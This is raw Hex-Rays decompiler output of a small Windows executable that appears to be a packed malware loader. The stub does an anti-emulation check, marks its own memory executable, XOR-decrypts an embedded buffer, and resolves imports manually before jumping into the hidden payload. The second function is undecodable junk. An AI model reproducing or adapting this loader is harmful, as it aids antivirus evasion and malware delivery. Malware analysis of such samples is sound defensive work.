/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// int __usercall start@<eax>(int@<ebx>, int@<ebp>, int@<edi>);
// int __usercall sub_402DE8@<eax>(unsigned int _EAX@<eax>, _WORD *_EDX@<edx>, int@<ecx>, int@<ebp>, _DWORD *@<edi>, _DWORD *@<esi>);

//-------------------------------------------------------------------------
// Data declarations

char byte_402617[] = { '\0' }; // weak
char byte_402618[] = { 'd' }; // weak
char byte_402619[] = { '‡' }; // weak
char byte_40261A[] = { 'ñ' }; // weak
char byte_40261B[] = { 'g' }; // weak
int dword_4038F8[194] =
{
  -488410094,
  1274757850,
  -697292914,
  1361834245,
  1066076186,
  596265294,
  -264187887,
  -784447548,
  2013950444,
  -796581588,
  1460533153,
  986713813,
  646466684,
  -176564985,
  -736869662,
  2095478042,
  -746511865,
  1417737426,
  1000868967,
  663506293,
  -197078016,
  -721140749,
  1945466353,
  -587780834,
  1537145769,
  884409157,
  672678598,
  -90252424,
  -607433468,
  1922726739,
  -574215102,
  1516239505,
  896860823,
  690963405,
  -92743071,
  -619360798,
  1911651318,
  -560320761,
  1502673362,
  915407209,
  713506931,
  -115877380,
  -663073123,
  1901230251,
  -562221173,
  1496840503,
  908394970,
  705183978,
  -124200829,
  -638562531,
  1894021395,
  -457757182,
  1674957807,
  214514473,
  569461529,
  -224603512,
  -738769662,
  1274757642,
  -457763548,
  1674953711,
  214514493,
  284523033,
  -1013914752,
  -488410094,
  1274757642,
  -457763548,
  1674953711,
  214514493,
  284523033,
  -1013914752,
  -488410094,
  1274757642,
  -457763548,
  1674953711,
  214514493,
  284523033,
  -1013914752,
  -488410094,
  1274757642,
  -457763548,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
// extern BOOL (__stdcall *AreAllAccessesGranted)(DWORD GrantedAccess, DWORD DesiredAccess);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern PSTR (__stdcall *StrChrA)(PCSTR pszStart, WORD wMatch);
char byte_405000[512] =
{
  '\x11',
  '=',
  '+',
  '\x9D',
  'Ã',
  'Å',
  '7',
  'ò',
  'ç',
  '„',
  '\v',
  'î',
  '~',
  '\x1D',
  'n',
  '=',
  'ì',
  'Š',
  '\x1D',
  '\x1C',
  'ô',
  '¼',
  '\x05',
  'µ',
  'Ú',
  'ë',
  'I',
  '\x1A',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak


//----- (00401000) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>)
{
  unsigned int v3; // esi
  HMODULE LibraryA; // eax
  BOOL (__stdcall *AddAce)(PACL, DWORD, DWORD, LPVOID, DWORD); // eax
  int v7; // edi
  unsigned int v8; // eax
  char v9; // cl
  unsigned int v10; // esi
  char v11; // dl
  unsigned int v12; // esi
  char v13; // cl
  unsigned int v14; // esi
  char v15; // dl
  int *v16; // edi
  char *v17; // ebp
  unsigned int v18; // ebx
  char *v19; // edx
  int v20; // ecx
  char *v21; // eax
  char *v22; // ebx
  int v23; // edx
  HMODULE v24; // eax
  int v25; // edi
  int v26; // eax
  FARPROC ProcAddress; // eax
  void *retaddr; // [esp+20h] [ebp+0h] BYREF
  HMODULE hModule; // [esp+24h] [ebp+4h]
  HMODULE hModulea; // [esp+24h] [ebp+4h]
  char *v31; // [esp+28h] [ebp+8h]

  v3 = 0;
  if ( !StrChrA("StrChr", 0) )
  {
    LibraryA = LoadLibraryA("advapi32.dll");
    AddAce = (BOOL (__stdcall *)(PACL, DWORD, DWORD, LPVOID, DWORD))GetProcAddress(LibraryA, "AddAce");
    v7 = ((__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, int, int))AddAce)(
           0,
           0,
           0,
           0,
           0,
           a3,
           a2,
           a1)
       + 28;
    if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
      v7 ^= 0xEu;
    VirtualProtect(start, 0x3000u, 0x40u, (PDWORD)&retaddr);
    v8 = 0;
    while ( 1 )
    {
      if ( v3 == v7 )
        v3 = 0;
      v9 = byte_402618[v8] ^ byte_405000[v3];
      v10 = v3 + 1;
      byte_402618[v8] = v9 ^ 0xFE;
      if ( v10 == v7 )
        v10 = 0;
      v11 = byte_402619[v8] ^ byte_405000[v10];
      v12 = v10 + 1;
      byte_402619[v8] = v11 ^ 0xFE;
      if ( v12 == v7 )
        v12 = 0;
      v13 = byte_40261A[v8] ^ byte_405000[v12];
      v14 = v12 + 1;
      byte_40261A[v8] = v13 ^ 0xFE;
      if ( v14 == v7 )
        v14 = 0;
      v15 = byte_40261B[v8] ^ byte_405000[v14];
      v8 += 4;
      byte_402617[v8] = v15 ^ 0xFE;
      v3 = v14 + 1;
      if ( v8 >= 0x1420 )
      {
        v16 = dword_4038F8;
        v17 = &byte_402618[-640];
        v18 = 0;
        v19 = &byte_402618[-268436096];
        hModule = 0;
        while ( 1 )
        {
          v20 = (int)(v16 + 2);
          if ( (unsigned int)(v16[1] - 8) >> 1 )
          {
            v3 = (unsigned int)(v16[1] - 8) >> 1;
            do
            {
              if ( (*(_WORD *)v20 & 0xF000) == 12288 )
              {
                v18 *= 2;
                v21 = &v17[*v16 + (*(_WORD *)v20 & 0xFFF)];
                *(_DWORD *)v21 += v19;
              }
              v20 += 2;
              --v3;
            }
            while ( v3 );
            v18 = (unsigned int)hModule;
          }
          v18 += v16[1];
          hModule = (HMODULE)v18;
          v3 = v20 + 8 * v3;
          v16 = (int *)((char *)v16 + v16[1]);
          if ( v18 >= 0xE4 )
          {
            v22 = &byte_402618[2780];
            v31 = &byte_402618[2780];
            v23 = 5 * (_DWORD)v19;
            if ( *(_DWORD *)&byte_402618[2796] )
            {
              do
              {
                v24 = LoadLibraryA(&v17[*((_DWORD *)v22 + 3)]);
                hModulea = v24;
                if ( v24 )
                {
                  v25 = *(_DWORD *)v22;
                  if ( !*(_DWORD *)v22 )
                    v25 = *((_DWORD *)v22 + 4);
                  v16 = (int *)&v17[v25];
                  v20 = (int)(v24 + 2 * v20);
                  v3 = (unsigned int)&v17[*((_DWORD *)v22 + 4)];
                  if ( *v16 )
                  {
                    do
                    {
                      v26 = *v16;
                      if ( *v16 >= 0 )
                        ProcAddress = GetProcAddress(hModulea, &v17[v26 + 2]);
                      else
                        ProcAddress = GetProcAddress(hModulea, (LPCSTR)(unsigned __int16)v26);
                      *(_DWORD *)v3 = ProcAddress;
                      v22 = (char *)++v16 + 2 * (_DWORD)v22;
                      v3 += 4;
                    }
                    while ( *v16 );
                    v22 = v31;
                  }
                }
                v22 += 20;
                v31 = v22;
              }
              while ( *((_DWORD *)v22 + 4) );
            }
            sub_402DE8((unsigned int)sub_402DE8, (_WORD *)v23, v20, (int)v17, v16, (_DWORD *)v3);
            ExitProcess(0);
          }
        }
      }
    }
  }
  return 0;
}
// 4011A2: variable 'v20' is possibly undefined
// 4011FA: variable 'v23' is possibly undefined
// 4038F8: using guessed type int dword_4038F8[194];

//----- (00402DE8) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_402DE8@<eax>(
        unsigned int _EAX@<eax>,
        _WORD *_EDX@<edx>,
        int a3@<ecx>,
        int a4@<ebp>,
        _DWORD *a5@<edi>,
        _DWORD *a6@<esi>)
{
  _DWORD *v7; // et0
  bool v8; // cf
  int result; // eax

  while ( 1 )
  {
    *(_DWORD *)(a4 + 1702276039) *= 2;
    if ( a3 )
      break;
    v7 = (_DWORD *)_EAX;
    _EAX = a5;
    a5 = v7;
    __asm { aad     0B6h ; '¶' }
  }
  __asm { bound   esp, [edx-16h] }
  LOBYTE(_EAX) = _EAX ^ 0x7F;
  __outdword((unsigned __int16)_EDX, _EAX);
  v8 = *_EDX < (unsigned __int16)_EDX;
  *_EDX -= (_WORD)_EDX;
  *a5 = *a6;
  _EAX = _EAX - (v8 - 1006963840);
  __asm { aad     71h ; 'q' }
  return result;
}
// 402DFF: positive sp value 4 has been found

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
